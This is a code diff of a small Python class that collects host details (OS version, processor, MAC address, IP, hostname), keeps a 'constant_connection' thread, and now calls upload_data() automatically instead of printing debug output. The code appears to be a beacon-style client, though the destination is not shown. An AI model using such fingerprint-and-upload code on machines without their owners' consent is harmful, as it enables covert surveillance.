@@ -15,7 +15,7 @@ class main:
         self.grab_specs()
         threading.Thread(target=self.constant_connection).start()
     def grab_specs(self):
-        self.os_type = platform.platform()
+        self.os_type = platform.version()
         self.processor = platform.processor()
         self.mac_address = get_mac_address()
 
@@ -27,12 +27,7 @@ class main:
         
         self.host_name = socket.gethostname()
 
-    
-        # print(self.os_type)
-        # print(self.processor)
-        # print(self.ip_address)
-        # print(self.host_name)
-        # self.upload_data()
+        self.upload_data()
 
     def upload_data(self):
         print("Sending request...")
